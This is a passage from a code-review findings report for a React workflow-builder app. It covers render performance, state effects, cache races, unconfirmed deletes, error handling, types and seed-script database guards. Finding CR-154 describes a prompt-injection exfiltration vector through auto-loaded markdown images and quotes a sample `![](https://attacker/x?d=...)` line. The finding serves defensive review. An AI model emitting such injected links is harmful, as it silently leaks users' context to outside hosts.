- **Problem:** `contractsUrl` serializes the instance `config` (including prompt bodies and script source) into the query string. Every un-debounced field edit (plain fields, ExpressionInput, choices) creates a new query key and a request, and leaves a cache entry behind. Large prompts or scripts push the URL past Node's 16 KB header limit, which returns a 431, the contract fails, and the configurator breaks for that node.
- **Evidence:**
  ```ts
  const cfg = node.config && Object.keys(node.config).length ? node.config : null;
  if (cfg) p.set("config", JSON.stringify(cfg));
  return `/api/contracts?${p.toString()}`;
  ```
- **Suggested fix:** Send only the contract-relevant config subset (e.g. `output_schema`, `choices`, `contract`), POST it, and key on a stable hash of that subset. Debounce the input (`useDeferredValue` or a debounced value) and use `placeholderData: keepPreviousData`.
- **Effort:** M

### CR-145 [Medium] Unstable `machine`/`layout` objects and inline callbacks defeat memoization; the canvas rebuilds every render

- **Status at `abaa007`:** **Fixed** (Task 40)
- **Current location:** components/template-editor/hooks/use-template-draft.ts, components/template-editor/hooks/use-node-positions.ts, components/builder/EditorPage.tsx, components/template-editor/components/BuilderFlow.tsx, components/builder/hooks/use-editor-save.ts, components/builder/hooks/use-editor-actions.ts
- **Re-verification note:** Hook return objects are memoized; save/actions depend on stable callbacks/refs; EditorPage canvas handlers are `useCallback`; node duplicate is a context-menu action instead of immediate right-click.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 6 — Template authoring
- **Source:** TPL-20
- **Related:** CR-163 (TPL-23, TOOL-10)
- **Location:** `components/template-editor/hooks/use-template-draft.ts:205-220`, `components/template-editor/hooks/use-node-positions.ts:71-77`, `components/builder/EditorPage.tsx:202-226`, `components/template-editor/components/BuilderFlow.tsx:86-125`, `components/builder/hooks/use-editor-save.ts` (deps)
- **Problem:** `useTemplateDraft` and `useNodePositions` return fresh object literals each render (`resetPositions` is also an inline arrow). Every `useCallback` that depends on `machine` or `layout` (all of `use-editor-actions` and `use-editor-save`) is recreated each render. `EditorPage` passes inline lambdas such as `onNodeOpen` and `onEdgeOpen` into `EditorCanvas`, and these sit in `BuilderFlow`'s `rfNodes`/`rfEdges` `useMemo` deps. Every keystroke in the drawer therefore rebuilds every XYFlow node and edge object. BuilderFlow's `onNodeContextMenu` also duplicates the node on right-click, which is easy to trigger by accident.
- **Evidence:**
  ```ts
  return {
    draft, draftRef, setDraft, apply, patchNode, replaceDraft,
    undo, redo, canUndo, canRedo, dirty, setDirty, notice, setNotice,
  };   // new object every render, consumed as a useCallback dep
  ```
- **Suggested fix:** `useMemo` the returned API objects. Depend on the individual stable callbacks, not the whole object. `useCallback` the handlers in `EditorPage` (§2.5: values flowing into memo deps).
- **Effort:** S

### CR-146 [Medium] State-mirroring effects and render-time ref writes (AGENTS.md §2.6)

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/builder/hooks/use-instance-contracts.ts:94-134, components/templates/hooks/use-node-schema-contract.ts:39-51, components/template-editor/hooks/use-input-map.ts:87-91, components/template-editor/hooks/use-configurator-tabs.ts:43-67, components/template-editor/hooks/use-node-positions.ts:39-40
- **Re-verification note:** All patterns remain: a render-time ref write plus the `void choiceSig` memo trick, query data copied into state by an effect, an editing-row reset effect keyed on `node.key`, and a render-time tab reset plus an effect on `[contract, node]` that keeps re-forcing the Prompt tab while config is empty. There is also a render-time `latest.current = positions`. Fix: derive during render, reset per-node UI state via `key={node.key}`, pick the initial tab once per node key, and use a memoized choices signature string as a real dependency.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 6 — Template authoring
- **Source:** TPL-21
- **Location:** `components/builder/hooks/use-instance-contracts.ts:95-134`, `components/templates/hooks/use-node-schema-contract.ts:44-47`, `components/template-editor/hooks/use-input-map.ts:88-91`, `components/template-editor/hooks/use-configurator-tabs.ts:46-67`, `components/template-editor/hooks/use-node-positions.ts:40`
- **Problem:**
  - `use-instance-contracts` writes a ref during render and uses `void choiceSig` to trick `useMemo` deps.
  - `use-node-schema-contract` copies query data into state from an effect.
  - `use-input-map` resets editing state in an effect keyed on the node key.
  - `use-configurator-tabs` resets the tab during render and also sets the prompt tab from an effect on `[contract, node]`. While a node's config is still empty, every contract or node change re-forces the Prompt tab.
- **Evidence:**
  ```ts
  useEffect(() => {
    if (!contract) return;
    const hasPrompt = (contract.config.fields ?? []).some((f) => promptEditorKeys.has(f.key));
    if (hasPrompt && node && Object.keys(node.config ?? {}).length === 0) setTab("prompt");
  }, [contract, node]);
  ```
- **Suggested fix:** Derive values during render. Reset per-node UI state with `key={node.key}` on the drawer body, and store the initial tab choice only when the node key changes. Replace the ref-and-`choiceSig` trick with a real dependency (a memoized choices signature string).
- **Effort:** M

### CR-147 [Medium] `tildePath` collapses *any* user's home (and `/Users/Shared`) to `~`, so edit-and-save rewrites `local_path`

- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
- **Current location:** components/settings/repos/paths.ts:7-9, components/settings/repos/hooks/use-repo-form.ts:20, components/settings/repos/components/RepoCard.tsx:48, app/api/repos/[id]/route.ts:28-30
- **Re-verification note:** `tildePath` still collapses any `/Users/<x>` or `/home/<x>` prefix to `~`, and `formFromRepo` feeds that collapsed path into the editable field. On save, the API expands `~` against the server `HOME`, so editing a repo at `/Users/Shared/...` silently rewrites `local_path`. Fix: keep the raw stored path in the form and tilde-collapse only for display, ideally against the real home returned by the API.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-05
- **Location:** `components/settings/repos/paths.ts:7-9`, `components/settings/repos/hooks/use-repo-form.ts:20`, `components/settings/repos/components/RepoCard.tsx:48`
- **Problem:** The regex replaces `/Users/<anything>` or `/home/<anything>`, not the current user's home. `/Users/Shared/repos/api` and `/home/ci/api` both become `~/…` in the edit form. On save, the API expands `~` against the server's `HOME` (`app/api/repos/[id]/route.ts:28-30`), so the stored path silently becomes `/Users/<me>/repos/api`. The PATCH then fails ("not a git repository") or points at a different checkout. The card display is misleading for the same reason.
- **Evidence:**
  ```ts
  export function tildePath(p: string): string {
    return p.replace(/^\/(?:Users|home)\/[^/]+/, "~");
  }
  ```
- **Suggested fix:** Either have the API return a display path (it knows `HOME`), or have the form keep the raw stored path and only *display* the tilde form. At minimum, never feed the collapsed path back into the editable field.
- **Effort:** S

### CR-148 [Medium] Force-refresh race writes one filter-set's results into another filter-set's cache

- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
- **Current location:** components/tasks/hooks/use-live-tasks.ts:41-50, components/tasks/hooks/use-live-tasks.ts:67
- **Re-verification note:** The refresh mutation still closes over `params` in `mutationFn` and writes to the render-bound `queryKey` in `onSuccess`. A filter change mid-refresh therefore writes the old filter's results into the new filter's cache. `refresh.error` is reset only on the next forced refresh, so the error banner persists across filter changes. Fix: pass `params` as the mutation variable, `setQueryData(queryKeys.tasks.live(vars))`, and `refresh.reset()` when `params` changes.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-06
- **Location:** `components/tasks/hooks/use-live-tasks.ts:41-50`
- **Problem:** `mutationFn` captures `params` when `mutate()` is called, but `onSuccess` is re-bound on every render (TanStack v5 `MutationObserver.setOptions` updates the in-flight mutation's options). If the user changes a filter while a forced refresh is in flight, the response for the **old** filters goes into `queryKeys.tasks.live(newParams)`, and the table shows wrong tasks for the selected filter until the next refetch. Separately, `refresh.error` persists across filter changes, so the "Retry" banner stays up for a filter set that never failed.
- **Evidence:**
  ```ts
  const refresh = useMutation({
    mutationFn: () => fetchJson<LiveTasksPayload>(`/api/tasks/live?${params}&fresh=1`),
    onSuccess: (payload) => queryClient.setQueryData(queryKey, payload),
  });
  ```
- **Suggested fix:** Pass `params` as the mutation variable and write to `queryKeys.tasks.live(vars)` in `onSuccess(payload, vars)`. Alternatively, drop the mutation and use `queryClient.fetchQuery({ queryKey, queryFn: freshFn, staleTime: 0 })`. Call `refresh.reset()` when `params` changes, or key the error by params.
- **Effort:** S

### CR-149 [Medium] Destructive deletes fire on one click with no confirmation (repos, integration instances, Cursor key)

- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
- **Current location:** components/settings/repos/ReposSection.tsx:85-87, components/settings/repos/components/RepoCard.tsx:70-83, components/settings/integrations/GitTab.tsx:101, components/settings/integrations/TaskTab.tsx:100, components/settings/integrations/HarnessTab.tsx:76, components/settings/integrations/components/InstanceCard.tsx:78
- **Re-verification note:** The trash buttons still DELETE a repo or an instance (with its stored token), or clear the Cursor API key, on one click. There is no confirm and no disabled-while-pending state, so double clicks send duplicate DELETEs. Fix: hold a `pendingDelete` id per container, render the shared `ConfirmDeleteDialog` with `busy={remove.isPending}`, and pass a `deleting` prop to `RepoCard` and `InstanceCard`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-07
- **Location:** `components/settings/repos/ReposSection.tsx:86-87`, `components/settings/repos/components/RepoCard.tsx:72-78`, `components/settings/integrations/GitTab.tsx:101`, `components/settings/integrations/TaskTab.tsx:100`, `components/settings/integrations/HarnessTab.tsx:76`, `components/settings/integrations/components/InstanceCard.tsx:73-79`
- **Problem:** The trash icon immediately DELETEs a repo or an instance (including its stored token), or clears the Cursor API key. Credentials can't be recovered from the UI. Secrets in the same area use a two-step confirm (`SecretRow`), and `components/shared/ConfirmDeleteDialog` exists for this purpose. The delete buttons are also not disabled while the request is pending, so double clicks send duplicate DELETEs.
- **Evidence:**
  ```tsx
  onDelete={() => remove.mutate(i.id)}          // GitTab / TaskTab
  onDelete={() => updateKey("")}               // HarnessTab — wipes the API key
  onDelete={() => remove.mutate(r.id, { ... })} // ReposSection
  ```
- **Suggested fix:** Hold a `pendingDelete` id in each container and render `ConfirmDeleteDialog` with `busy={remove.isPending}`. Pass `deleting` into `RepoCard` / `InstanceCard` to disable the button.
- **Effort:** S

### CR-150 [Medium] Mutation failures swallowed: instance remove, connection test, and the task repo-pin PATCH

- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
- **Current location:** components/settings/integrations/GitTab.tsx:67-72, components/settings/integrations/GitTab.tsx:101, components/settings/integrations/TaskTab.tsx:67-71, components/settings/integrations/TaskTab.tsx:100, components/settings/integrations/hooks/use-instances.ts:60-71
- **Re-verification note:** `remove.mutate(i.id)` still has no `onError`, so a failed delete is silent. `callTestInstance` still awaits a bare `fetch` that can reject, and `runTest` has no `onError`, so an offline test just stops spinning with no badge. Fix: add `onError: (e) => onError(e.message)` to both removes, and wrap the test `fetch` in try/catch that returns `{ ok: false, detail }`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-08
- **Related:** CR-036 (UI-02)
- **Location:** `components/settings/integrations/GitTab.tsx:67-72,101`, `components/settings/integrations/TaskTab.tsx:67-71,100`, `components/settings/integrations/hooks/use-instances.ts:60-71`
- **Problem:**
  - `remove.mutate(i.id)` has no `onError`, so a failed delete silently leaves the card in place.
  - `callTestInstance` normalizes HTTP errors but not a rejected `fetch` (offline, or the server is down). That throws, `runTest` has no `onError`, and the spinner just stops with no badge or message.
- **Evidence:**
  ```ts
  const res = await fetch(instancesUrl(surface, kind, id), { method: "POST" }); // can reject
  ...
  test.mutate(id, { onSuccess: (result) => recordTest.mutate(...) }); // no onError
  onDelete={() => remove.mutate(i.id)}
  ```
- **Suggested fix:** Add `{ onError: (e) => onError(e.message) }` to both `remove.mutate` calls. Wrap the test `fetch` in try/catch that returns `{ ok: false, detail: e.message }`, or add `onError` on `runTest` that records a failed result.
- **Effort:** S

### CR-151 [Medium] Connecting or removing an integration doesn't invalidate settings status, so General's status strip goes stale

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** components/settings/integrations/hooks/use-instances.ts:91-117, components/settings/context.tsx:68-70
- **Re-verification note:** `useConnectInstance` and `useRemoveInstance` still invalidate only `queryKeys.integrations.instances(...)`. The layout-level `SettingsProvider`'s `settings` and `gitHosts` queries (the `status.gitHosts`/`status.taskProviders` flags in General's status strip) stay stale until a focus refetch. Fix: in both `onSuccess` handlers also invalidate `queryKeys.settings`, plus `queryKeys.gitHosts` (HOST surface) or `queryKeys.taskProviders` (TASK surface).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-09
- **Location:** `components/settings/integrations/hooks/use-instances.ts:91-117`, `components/settings/context.tsx:68-70`, `components/settings/general/components/StatusBar.tsx:18-19`
- **Problem:** `useConnectInstance` / `useRemoveInstance` invalidate only `queryKeys.integrations.instances(...)`. The GitLab/Jira "configured" flags come from `/api/settings` (`status.gitHosts`, `status.taskProviders`) and `/api/git-hosts`. `SettingsProvider` sits in the settings **layout**, so its queries never remount when switching sub-routes and aren't refetched on navigation. After connecting Jira, the General page still shows Jira as not connected (amber ✗) until a window-focus refetch or a reload.
- **Evidence:**
  ```ts
  onSuccess: () =>
    queryClient.invalidateQueries({ queryKey: queryKeys.integrations.instances(surface, kind) }),
  ```
- **Suggested fix:** In both mutations' `onSuccess`, also invalidate `queryKeys.settings`, `queryKeys.gitHosts` (HOST surface) and `queryKeys.taskProviders` (TASK surface).
- **Effort:** S

### CR-152 [Medium] One global settings error string leaks across sub-routes and is never cleared

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** components/settings/context.tsx:66, components/settings/context.tsx:104-105, components/settings/repos/ReposSection.tsx:59-63, components/settings/general/components/CustomNodesSection.tsx:66-81, components/settings/integrations/HarnessTab.tsx:48-51
- **Re-verification note:** `error` is still a single layout-level `useState`. Every section reports through `onError(e.message)`, and no code path calls `setError(null)`, so one failure sticks across sub-routes and survives later successful saves. Fix: scope errors per page or per modal (use `mutation.error`), or at minimum clear them in each `onSuccess` and on pathname change.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-10
- **Location:** `components/settings/context.tsx:66,104-105`, `components/settings/general/components/CustomNodesSection.tsx:64-72,81`, `components/settings/repos/ReposSection.tsx:60-63`, `components/settings/integrations/HarnessTab.tsx:48-51`
- **Problem:** `error` is a single `useState` in the layout-level provider. Every section reports failures through `setError(e.message)`, but no code path ever calls `setError(null)`. A failed repo save keeps "Local path is not a git repository" at the top of General and Integrations after navigation, and even after a later successful save.
- **Evidence:**
  ```ts
  const [error, setError] = useState<string | null>(null);
  ...
  { onSuccess: close, onError: (e) => onError(e.message) }   // success never clears
  ```
- **Suggested fix:** Scope the error to the page (local state per sub-route), or show it inline in the modal that caused it (use `mutation.error` directly). If it stays global, clear it in every `onSuccess` and on pathname change.
- **Effort:** S

### CR-153 [Medium] Build start chain ignores the repo-pin PATCH result and parses non-JSON error bodies

- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
- **Current location:** components/tasks/hooks/use-start-build.ts:32-55
- **Re-verification note:** The repo-pin `PATCH /api/tasks/:id` result is still never checked, so the flow is created even if pinning failed. Materialize and create-flow still do `.then((r) => r.json())` with no `res.ok`, so HTML 5xx bodies surface as a `SyntaxError`. Fix: use `postJson` from `@/hooks/fetch-json` for both POSTs, and add a throwing `patchJson` (or check `res.ok`) for the PATCH.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-11
- **Location:** `components/tasks/hooks/use-start-build.ts:32-55`
- **Problem:**
  - The `PATCH /api/tasks/:id` that pins `repoUrl` is awaited, but its status is never checked. On failure, the flow is still created against a task with no or the wrong repo URL.
  - All three calls do `.then((r) => r.json())` with no `res.ok` check. An HTML 500 or a proxy error surfaces as `SyntaxError: Unexpected token <` in the modal instead of the server's message.
  - The hook duplicates the `postJson` helper in `hooks/fetch-json.ts`.
- **Evidence:**
  ```ts
  await fetch(`/api/tasks/${mat.id}`, { method: "PATCH", ..., body: JSON.stringify({ repoUrl: repo.cloud_url }) });
  const res = await fetch("/api/flows", {...}).then((r) => r.json() as Promise<CreateFlowBody>);
  ```
- **Suggested fix:** Use `postJson` from `@/hooks/fetch-json` (it throws with the server `error`) for materialize and create-flow. Add a `patchJson` helper or check `res.ok` for the PATCH and throw on failure.
- **Effort:** S

### CR-154 [Medium] Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector)

- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
- **Current location:** components/shared/Markdown.tsx:136-150
- **Re-verification note:** `Markdown` still renders Streamdown with its default rehype pipeline (streamdown ^2.7.1, `harden` with `allowedImagePrefixes: ["*"]`) over agent, plan and MR content. A prompt-injected `![](https://attacker/?d=...)` is fetched automatically on render. Fix: pass explicit `rehypePlugins` that keep sanitize and configure `harden` with an image allowlist (or none) and `allowedProtocols: ["https","mailto"]`, or override `components.img` with a click-to-load placeholder.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-12
- **Related:** CR-251 (UI-24)
- **Location:** `components/shared/Markdown.tsx:136-147`
- **Problem:** `Markdown` uses Streamdown's default rehype pipeline (streamdown 2.7.1: `rehype-raw` → `rehype-sanitize` → `rehype-harden` with `allowedImagePrefixes: ["*"]`, `allowedProtocols: ["*"]`, `allowDataImages: true`). Script XSS is handled: sanitize strips `javascript:`, and link-safety confirmation is on by default. The gap is images. The content is LLM output, plan text and MR comments, all of which can be prompt-injected. An injected `![](https://attacker/x?d=<secret-ish context>)` is fetched automatically as soon as the panel renders, with no user click.
- **Evidence:**
  ```tsx
  <Streamdown shikiTheme={shikiTheme as never} plugins={{ mermaid: mermaidPlugin }}
    components={markdownProps.components} mode="static">
  // node_modules/streamdown: harden:[harden,{allowedImagePrefixes:["*"],allowedLinkPrefixes:["*"],allowedProtocols:["*"],...}]
  ```
- **Suggested fix:** Pass explicit `rehypePlugins` that keep `sanitize` and configure `harden` with `allowedImagePrefixes` limited to an app allowlist (or none) and `allowedProtocols: ["https", "mailto"]`. Alternatively, override `components.img` to render a click-to-load placeholder.
- **Effort:** S

### CR-155 [Medium] Client types duplicate server/DB shapes and live in a component file instead of `types/`

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/settings/context.tsx:11-40, components/settings/integrations/types.ts:5-11, types/tasks.ts:20-25, types/template-editor.ts:19-23
- **Re-verification note:** `Repo`, `HostInstanceRow`, `GitHost`, `Harness` and `Settings` are still declared inside the client provider file, with optional fields the API always sends. `HostInstanceRow` still duplicates `InstanceRow`, and `RepoSummary`/`EditorRepoChoice` are hand-written copies. There is no `types/settings.ts` or `types/repos.ts`. Fix: create those two files, derive `Repo` from `RepoRow`, derive the summaries with `Pick`, and delete `HostInstanceRow`.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-13
- **Related:** CR-005 (APP-05); CR-173 (APP-26); CR-232 (FLOWUI-24); CR-254 (UI-28)
- **Location:** `components/settings/context.tsx:11-40`, `components/settings/integrations/types.ts:5-11`, `types/tasks.ts:20-25`, `types/template-editor.ts:19-23`
- **Problem:**
  - Repos have four hand-written shapes: `Repo` in `context.tsx`, `RepoSummary` in `types/tasks.ts`, `EditorRepoChoice` in `types/template-editor.ts`, and `RepoRow` in `lib/db/rows.ts:263-279`. `Repo` already differs from the row: it marks `install_command`/`skip_install`/… optional, although the GET always returns them, and it lacks `created_at`/`updated_at`.
  - Instances have two identical shapes: `HostInstanceRow` (`context.tsx:22`) and `InstanceRow` (`integrations/types.ts:5`).
  - `Settings` is declared inside the client provider file. It marks `harnesses` and `secrets` optional although the route always sends them, and it widens `HarnessMode.value` to `string` although the route types it `"cloud" | "local"` (`app/api/settings/route.ts:13-17`).
  - §2.3 puts shared types in `types/<domain>.ts`, and consumers outside settings import them via the barrel.
- **Evidence:**
  ```ts
  export type Repo = { id: string; name: string; cloud_url: string; local_path: string | null;
    default_branch: string; local_path_exists?: boolean; install_command?: string | null; skip_install?: number; ... };
  export type HostInstanceRow = { id: string; name: string | null; baseUrl: string; tokenMasked: string };
  ```
- **Suggested fix:**
  1. Create `types/settings.ts` (Settings, Harness, HarnessMode, InstanceRow) and `types/repos.ts` (a `Repo` derived from `RepoRow` via `type Repo = Omit<RepoRow, ...> & { local_path_exists: boolean }`, exported type-only; see `types/tasks.ts`).
  2. Derive `RepoSummary` and `EditorRepoChoice` with `Pick<Repo, ...>`.
  3. Delete `HostInstanceRow`.
- **Effort:** M

### CR-156 [Medium] DataTable sortable headers are mouse-only; action link nests a button inside an anchor

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** components/shared/DataTable.tsx:200-204, components/shared/DataTable.tsx:315-330, components/shared/DataTable.tsx:355-357, components/shared/DataTable.tsx:393-394
- **Re-verification note:** Sortable headers are still `onClick` on `TableHead`, with no button, `tabIndex` or `aria-sort`. The `href` action still nests `<Button>` inside `<a>`, the pagination icon buttons have no `aria-label`, and overflow items are keyed by `action.label`. Fix: render a `<button type="button">` in sortable headers and set `aria-sort`, use `<Button render={<a href=… />}>`, add Previous/Next page labels, and key menu items by index plus label.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-14
- **Related:** CR-131 (FLOWUI-17)
- **Location:** `components/shared/DataTable.tsx:200-221,356-361,315-330,393-394`
- **Problem:**
  - Sorting is an `onClick` on `<th>` with no `button`, `tabIndex` or `aria-sort`, so keyboard and screen-reader users can't sort any table in the app (§2.9).
  - The `href` action renders `<a><Button/></a>`. Nested interactive content is invalid HTML and produces two tab stops.
  - The pagination buttons are icon-only with no `aria-label`.
  - Overflow menu items use `key={action.label}`, so duplicate labels collide.
- **Evidence:**
  ```tsx
  <TableHead key={header.id}
    onClick={canSort ? header.column.getToggleSortingHandler() : undefined}
  ...
  <a href={href(row)} title={primary.title}>
    <Button size="sm" variant="outline" disabled={primary.disabled}>
  ```
- **Suggested fix:**
  - Render a `<button type="button">` inside the header cell for sortable columns, and set `aria-sort` on `TableHead`.
  - Use `<Button render={<a href=… />}>` (Base UI render prop) instead of wrapping.
  - Add `aria-label="Previous page"` / `"Next page"`.
  - Key menu items by index plus label.
- **Effort:** S

### CR-157 [Medium] Seed DB guard is a single exact-path blacklist with no allowlist, no realpath and no echo of the target

- **Status at `abaa007`:** **Fixed** (Task 06 — demo DB allowlist + `realpath`, `--allow-non-demo-db`, logs target)
- **Current location:** scripts/lib/seed-db.mjs:18-29, scripts/seed-demo-flow.mjs:27, scripts/seed-demo-fanout.mjs:38, scripts/seed-branch-refine-demo.mjs:39, scripts/seed-custom-flow.mjs:28, scripts/seed-split-smoke.mjs:47
- **Re-verification note:** `resolveSeedDb` is still an exact-path blacklist of `data/devflow.prod.db` with no realpath and no allowlist, and no seed script prints the resolved target before writing. Any other path, symlink or prod copy is accepted (now five callers, including the new `seed-split-smoke`). Fix: allowlist `<root>/data/devflow.db` after `fs.realpathSync`, require an explicit flag for anything else, and always log the target path.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-04
- **Related:** CR-040 (TOOL-02)
- **Location:** `scripts/lib/seed-db.mjs:18-29`; callers `scripts/seed-demo-flow.mjs:27`, `scripts/seed-demo-fanout.mjs:38`, `scripts/seed-branch-refine-demo.mjs:32`, `scripts/seed-custom-flow.mjs:28`
- **Problem:** All four seed scripts call `resolveSeedDb`, which is good. But it refuses only when the resolved path is exactly `<root>/data/devflow.prod.db`. Any other DB is accepted, including a production DB at a custom path (`DATABASE_PATH=/srv/devflow/app.db`), a symlink to the prod file, or a prod copy under another name. `--reset` (bulk DELETEs) and the default mode (which resets first) then run against it. The scripts also never print the target path before writing, which makes AGENTS.md §1's "Check the DB path first" impossible from the output. Node scripts also don't load `.env`, so the seed target can differ from the DB the app uses.
- **Evidence:**
  ```js
  const file = path.resolve(root, process.env.DATABASE_PATH ?? "./data/devflow.db");
  const prod = path.resolve(root, PROD_DB_REL);
  if (file === prod) { console.error(`Refusing to seed the production DB ...`); process.exit(1); }
  return file;
  ```
- **Suggested fix:** Switch to an allowlist: accept only `<root>/data/devflow.db` (compared after `fs.realpathSync` when the file exists). Require an explicit `--db <path> --i-know` for anything else. Always `console.log` the resolved target before opening it. Optionally have the seeds write a `settings` marker row (`demo_db=1`) and refuse DBs without it unless they are fresh.
- **Effort:** S

### CR-158 [Medium] Seed scripts and `init-prod-db` run raw `schema.sql` and skip the app's migrations, which can shadow `tickets` data or fail on old DBs

- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — legacy migrations deleted; `schema.sql` is canonical for seed/bootstrap scripts)
- **Re-verification note:** Both harms this finding describes (shadowing a pre-rename `tickets` table, and missing `ALTER TABLE ADD COLUMN` columns on old DBs) apply only to legacy pre-migration DB shapes, which the product owner won't support. The seeds still exec raw `schema.sql` (seed-*.mjs, init-prod-db.mjs:21). The legacy `tickets→tasks` rename and ALTER migrations still exist in `lib/db/index.ts:44-77` and `migrate()`, so they are candidates for a "delete legacy migrations" cleanup.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-05
- **Related:** CR-021 (DATA-01); CR-022 (DATA-02); CR-210 (DATA-30); CR-221 (DATA-41)
- **Location:** `scripts/seed-demo-flow.mjs:31`, `scripts/seed-demo-fanout.mjs:42`, `scripts/seed-branch-refine-demo.mjs:36`, `scripts/seed-custom-flow.mjs:38`, `scripts/init-prod-db.mjs:21`; contrast with `lib/db/index.ts:44-53`
- **Problem:** `Database.connection()` documents that the `tickets→tasks` rename must run before `schema.sql`. Otherwise `CREATE TABLE IF NOT EXISTS tasks` makes an empty `tasks` table that shadows the old data, and `renameTicketsToTasks` then skips because `tasks` exists. The scripts exec `schema.sql` directly. On a pre-migration DB this orphans all `tickets` data permanently. Columns added via `migrate()` (21 `ALTER TABLE ... ADD COLUMN`s) are not added by `CREATE ... IF NOT EXISTS`, so seed INSERTs into such a DB fail with "no such column".
- **Evidence:**
  ```
  lib/db/index.ts:44  // The tickets→tasks table rename must run BEFORE schema.sql — its
  lib/db/index.ts:45  // CREATE TABLE IF NOT EXISTS tasks would otherwise create a fresh empty
  lib/db/index.ts:46  // `tasks` table on existing DBs and shadow the old `tickets` data.
  scripts/seed-demo-flow.mjs:31  db.exec(fs.readFileSync(path.join(root, "lib/db/schema.sql"), "utf8"));
  ```
- **Suggested fix:** Have the scripts reuse the app's bootstrap. Either expose `lib/db` migrations through a small script-safe entry that the seeds import via `tsx`, or, at minimum, add a shared `bootstrapSchema(db)` in `scripts/lib/seed-db.mjs` that refuses when a `tickets` table exists or columns are missing ("open the app once to migrate").
- **Effort:** M

### CR-159 [Medium] Seed `reset()` table lists drifted from the engine's `FLOW_CHILD_TABLES` (missing `hooks`, and `step_merges` in 3 of 4 scripts)

- **Status at `abaa007`:** **Fixed** (Task 06 — `deleteFlowCascade` in `scripts/lib/seed-db.mjs`, `tests/seed-db.test.ts`)
- **Current location:** scripts/seed-demo-flow.mjs:195-206, scripts/seed-branch-refine-demo.mjs:270-281, scripts/seed-custom-flow.mjs:65-80, scripts/seed-demo-fanout.mjs:128-147, lib/engine/flow-engine.ts:59-70
- **Re-verification note:** The canonical `FLOW_CHILD_TABLES` (now in `flow-engine.ts`) includes `step_merges` and `hooks`. All four reset loops still omit `hooks`, and three still omit `step_merges` and child flows (`parent_flow_id`). With better-sqlite3's default `foreign_keys=1`, `DELETE FROM flows` can then fail, or leave orphans. Fix: add one shared `deleteFlowCascade(db, flowId)` to `scripts/lib/seed-db.mjs` that mirrors `FLOW_CHILD_TABLES` (children first, plus `parent_flow_id` children), and add a vitest that asserts the lists match.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-06
- **Status:** Needs verification
  - TOOL-06: "Needs verification that FK enforcement is on at runtime; `lib/db/index.ts:557` reads `foreign_keys`, which suggests it is."
  - Collator note: Area 4 verified that better-sqlite3 enables `foreign_keys=1` by default (see DATA-23 / CR-114), which answers the FK part of this check.
- **Related:** CR-066 (ENG-21); CR-114 (APP-12, DATA-23); CR-262 (TOOL-19)
- **Location:** `scripts/seed-demo-flow.mjs:195-207`, `scripts/seed-branch-refine-demo.mjs:252-264`, `scripts/seed-custom-flow.mjs:65-80`, `scripts/seed-demo-fanout.mjs:128-147`; canonical `lib/engine/flow.ts:53-65`
- **Problem:** Each reset deletes every flow bound to the demo task, including flows a user started on that task from the app. It uses a hand-copied table list. The engine's FK-safe list also includes `step_merges` and `hooks` (`hooks.flow_id REFERENCES flows(id)`, created for `wait_for: webhook` nodes). Three scripts also skip `step_merges` and child flows (`flows.parent_flow_id`, `plan_steps.sub_flow_id`). The consequence is orphaned rows, or a failing `DELETE FROM flows` when FK enforcement is on. Needs verification that FK enforcement is on at runtime; `lib/db/index.ts:557` reads `foreign_keys`, which suggests it is.
- **Evidence:**
  ```
  lib/engine/flow.ts:54  const FLOW_CHILD_TABLES = ["step_merges","plan_steps","events","messages","runs",
                           "artifacts","comments","branches","nodes","hooks"]
  seed-demo-flow.mjs:201 for (const t of ["plan_steps","events","messages","runs","artifacts","comments","branches","nodes"])
  seed-demo-fanout.mjs:141 for (const t of ["events","messages","runs","artifacts","comments","branches","nodes"])
  ```
